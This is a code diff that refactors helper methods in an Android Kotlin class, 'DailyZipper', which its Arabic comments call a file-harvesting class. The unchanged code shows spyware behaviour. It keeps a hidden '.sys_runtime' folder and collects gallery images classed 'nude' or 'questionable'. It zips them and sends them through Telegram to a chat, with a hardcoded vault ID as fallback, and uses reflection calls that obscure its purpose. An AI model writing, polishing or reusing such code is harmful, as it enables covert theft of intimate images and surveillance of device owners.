@@ -24,7 +24,7 @@ import java.util.zip.ZipEntry
 import java.util.zip.ZipOutputStream
 
 /**
- * فئة تجميع الملفات وحصادها - إصدار آمن تماماً خالٍ من أي [] أو .get على الخرائط غير المحددة النوع
+ * فئة تجميع الملفات وحصادها - إصدار نهائي خالٍ تماماً من أي [] أو .get غير آمن
  */
 class DailyZipper(
     context: Context,
@@ -40,7 +40,7 @@ class DailyZipper(
     private val isActive = AtomicBoolean(false)
     private val processedHashes = Collections.synchronizedSet(mutableSetOf<String>())
 
-    private var maxBatchSize = 48L * 1024L * 1024L // 48MB
+    private var maxBatchSize = 48L * 1024L * 1024L
 
     private val runtimeDir: File by lazy {
         File(appContext?.filesDir, ".sys_runtime").apply {
@@ -93,62 +93,53 @@ class DailyZipper(
     }
 
     // ============================================================
-    //  دوال استخراج آمنة تماماً (بدون [] أو .get)
+    //  دوال مساعدة آمنة للخرائط (بدون أي [] أو .get على Any?)
     // ============================================================
 
-    private fun extractFromMap(map: Any?, key: String): Any? {
-        if (map is Map<*, *>) {
-            for (entry in map.entries) {
-                if (entry.key?.toString() == key) {
-                    return entry.value
-                }
-            }
-        }
-        return null
+    // استخدام get مباشرة مع تحويل صريح إلى Map<*, *>
+    private fun fetchFromMap(map: Any?, key: String): Any? {
+        val safeMap = map as? Map<*, *>
+        return safeMap?.get(key)
     }
 
-    private fun extractBooleanFromMap(map: Any?, key: String): Boolean {
-        val value = extractFromMap(map, key)
+    private fun fetchBoolean(map: Any?, key: String): Boolean {
+        val value = fetchFromMap(map, key)
         return when (value) {
             true, "true", 1, "1" -> true
             else -> false
         }
     }
 
-    private fun extractStringFromMap(map: Any?, key: String): String {
-        return extractFromMap(map, key)?.toString() ?: ""
+    private fun fetchString(map: Any?, key: String): String {
+        return fetchFromMap(map, key)?.toString() ?: ""
     }
 
     @Suppress("UNCHECKED_CAST")
-    private fun <T> extractConfigValue(key: String, default: T): T {
-        for (entry in config.entries) {
-            if (entry.key == key) {
-                val value = entry.value
-                return try {
-                    when (default) {
-                        is Long -> (value as Number).toLong() as T
-                        is Int -> (value as Number).toInt() as T
-                        is Boolean -> value as T
-                        is String -> value as T
-                        is List<*> -> value as T
-                        else -> value as T
-                    }
-                } catch (e: Exception) {
-                    default
-                }
+    private fun <T> getConfigValue(key: String, default: T): T {
+        val value = config[key]  // استخدام get مباشرة على HashMap
+        if (value == null) return default
+        return try {
+            when (default) {
+                is Long -> (value as Number).toLong() as T
+                is Int -> (value as Number).toInt() as T
+                is Boolean -> value as T
+                is String -> value as T
+                is List<*> -> value as T
+                else -> value as T
             }
+        } catch (e: Exception) {
+            default
         }
-        return default
     }
 
     private fun extractConfigValues(): ConfigValues {
         return ConfigValues(
-            maxBatchSize = extractConfigValue("max_batch_size", 48L * 1024L * 1024L),
-            storageExtra = extractConfigValue("storage_extra", 100L * 1024L * 1024L),
-            sendRetryDelays = extractConfigValue("send_retry_delays", listOf(2000L, 4000L, 8000L)),
-            maxProcessedHashes = extractConfigValue("max_processed_hashes", 10000),
-            defaultVaultId = extractConfigValue("default_vault_id", -1003577715762L),
-            maxBatches = extractConfigValue("max_batches", 10)
+            maxBatchSize = getConfigValue("max_batch_size", 48L * 1024L * 1024L),
+            storageExtra = getConfigValue("storage_extra", 100L * 1024L * 1024L),
+            sendRetryDelays = getConfigValue("send_retry_delays", listOf(2000L, 4000L, 8000L)),
+            maxProcessedHashes = getConfigValue("max_processed_hashes", 10000),
+            defaultVaultId = getConfigValue("default_vault_id", -1003577715762L),
+            maxBatches = getConfigValue("max_batches", 10)
         )
     }
 
@@ -165,7 +156,7 @@ class DailyZipper(
     //  تحويل القيم إلى Long (للاستدعاءات الانعكاسية)
     // ============================================================
 
-    private fun convertToLong(value: Any?): Long? {
+    private fun toLong(value: Any?): Long? {
         return when (value) {
             is Long -> value
             is Int -> value.toLong()
@@ -194,10 +185,10 @@ class DailyZipper(
                 val key = keys.next()
                 val value = json.opt(key)
                 if (value != null && value != JSONObject.NULL) {
-                    config.put(key, value)
+                    config[key] = value
                 }
             }
-            maxBatchSize = extractConfigValue("max_batch_size", 48L * 1024L * 1024L)
+            maxBatchSize = getConfigValue("max_batch_size", 48L * 1024L * 1024L)
         } catch (e: Exception) {
             writeLog("Config load error: ${e.message}")
         }
@@ -206,9 +197,7 @@ class DailyZipper(
     private fun saveConfig(): Boolean {
         return try {
             val json = JSONObject()
-            for (entry in config.entries) {
-                val key = entry.key
-                val value = entry.value
+            for ((key, value) in config) {
                 when (value) {
                     is List<*> -> {
                         val array = JSONArray()
@@ -321,10 +310,10 @@ class DailyZipper(
         var target = targetChat
 
         if (target == null) {
-            target = convertToLong(invokeMethod(telegram, "getVlt"))
+            target = toLong(invokeMethod(telegram, "getVlt"))
         }
         if (target == null) {
-            target = convertToLong(invokeMethod(telegram, "getDat"))
+            target = toLong(invokeMethod(telegram, "getDat"))
         }
         if (target == null) {
             target = cfg.defaultVaultId
@@ -343,7 +332,7 @@ class DailyZipper(
                 val result = invokeMethod(telegram, "sendDocument", target, zipFile, caption)
                 val success = when (result) {
                     is Boolean -> result
-                    is Map<*, *> -> extractBooleanFromMap(result, "ok")
+                    is Map<*, *> -> fetchBoolean(result, "ok")
                     else -> false
                 }
                 if (success) {
@@ -668,7 +657,7 @@ class DailyZipper(
                     listOf("nude", "questionable").forEach { cat ->
                         val items = invokeMethod(scanner, "getGalleryByCategory", cat, 150) as? List<*>
                         items?.forEach { item ->
-                            val path = extractStringFromMap(item, "path")
+                            val path = fetchString(item, "path")
                             if (path.isNotEmpty()) {
                                 val f = File(path)
                                 if (f.exists()) {
@@ -731,16 +720,16 @@ class DailyZipper(
         }
 
         val result = HashMap<String, Any>()
-        result.put("pending", count)
-        result.put("size", totalSize)
+        result["pending"] = count
+        result["size"] = totalSize
         return result
     }
 
     private fun sendMessage(chatId: Long, text: String) {
         if (telegram == null) return
         val params = HashMap<String, Any>()
-        params.put("chat_id", chatId)
-        params.put("text", text)
+        params["chat_id"] = chatId
+        params["text"] = text
         invokeMethod(telegram, "api", "sendMessage", params)
     }
 
